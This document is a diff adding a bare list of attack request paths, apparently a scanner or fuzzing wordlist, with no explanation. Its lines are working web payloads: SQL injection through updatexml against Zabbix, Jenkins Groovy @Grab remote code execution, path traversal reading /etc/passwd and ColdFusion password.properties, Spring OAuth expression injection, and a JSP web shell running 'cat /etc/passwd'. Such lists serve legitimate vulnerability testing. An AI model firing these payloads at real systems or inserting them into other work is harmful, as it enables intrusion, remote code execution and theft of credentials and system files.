@@ -1,0 +1,13 @@
+/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::
+/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;
+/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
+/run
+/ws/v1/cluster/apps/new-application
+/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
+/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
+/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test
+/poc.jsp/
+/poc.jsp?cmd=cat+%2Fetc%2Fpasswd
+/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+/WEB-INF/web.xml
+/%2e/WEB-INF/web.xml
